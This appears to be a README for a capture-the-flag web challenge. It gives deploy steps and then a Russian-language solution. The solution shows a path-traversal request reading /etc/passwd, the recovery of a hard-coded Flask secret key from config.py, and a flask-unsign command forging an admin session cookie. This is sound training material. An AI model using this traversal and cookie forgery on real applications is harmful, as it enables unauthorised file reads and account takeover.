
### Deploy
* Change .env
* Change admin password in init.sql query
* Change secret key in config.py
* Change flag in strongbox/app/config.py
```sh
#> docker-compose up
```
### решение
0) Регистрируемся
1) В функционале перевода паролей в csv находим lfi:
```sh
http://address:31337/download?fn=../etc/passwd
```


2) (сложная часть) находим файл /app/config.py, видим там секрет, которым подписываются сессии фласка
```sh
90e714e15f86badc25dd703620d8151d
```

3) Подписываем этим ключем токен
```sh
flask-unsign --sign --cookie "{'username': 'admin'}" --secret '90e714e15f86badc25dd703620d8151d'
```
В сохраненных паролях админа будет флаг

Примечание: флаг по пути /flag.txt фейковый
